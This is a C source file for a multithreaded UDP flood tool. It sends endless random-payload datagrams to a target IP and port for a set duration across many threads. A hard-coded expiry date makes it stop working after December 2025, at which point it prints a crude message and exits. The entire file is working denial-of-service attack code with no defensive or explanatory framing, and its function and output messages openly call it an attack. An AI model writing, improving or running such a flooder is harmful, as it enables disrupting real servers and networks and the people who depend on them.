#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>

#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 12
#define EXPIRATION_DAY 2

volatile sig_atomic_t stop_attack = 0;

typedef struct {
    char *ip;
    int port;
    int duration;
    int packet_size;
} ThreadArgs;

void handle_signal(int signal) {
    if (signal == SIGINT) {
        stop_attack = 1;
    }
}

void *attack_thread(void *args) {
    ThreadArgs *data = (ThreadArgs *)args;
    struct sockaddr_in server_addr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    char *packet = malloc(data->packet_size);
    if (!packet) {
        perror("Memory allocation failed");
        close(sock);
        return NULL;
    }

    srand(time(NULL));
    for (int i = 0; i < data->packet_size; i++) {
        packet[i] = rand() % 256;
    }

    time_t start_time = time(NULL);
    while (!stop_attack && (time(NULL) - start_time < data->duration)) {
        sendto(sock, packet, data->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    free(packet);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s [IP] [PORT] [DURATION] [PACKET_SIZE] [THREAD_COUNT]\n", argv[0]);
        return 1;
    }

    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (packet_size <= 0 || thread_count <= 0) {
        printf("Error: PACKET_SIZE and THREAD_COUNT must be positive integers.\n");
        return 1;
    }

    time_t t = time(NULL);
    struct tm *current_time = localtime(&t);
    
    if (current_time->tm_year + 1900 > EXPIRATION_YEAR ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR && current_time->tm_mon + 1 > EXPIRATION_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR && current_time->tm_mon + 1 == EXPIRATION_MONTH && current_time->tm_mday > EXPIRATION_DAY)) {
        printf("Chud Gya HAi.\n");
        return 1;
    }
    
    signal(SIGINT, handle_signal);
    
    pthread_t threads[thread_count];
    ThreadArgs args = {argv[1], atoi(argv[2]), atoi(argv[3]), packet_size};
    
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, attack_thread, &args);
    }
    
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("Attack finished. All threads stopped.\n");
    return 0;
}
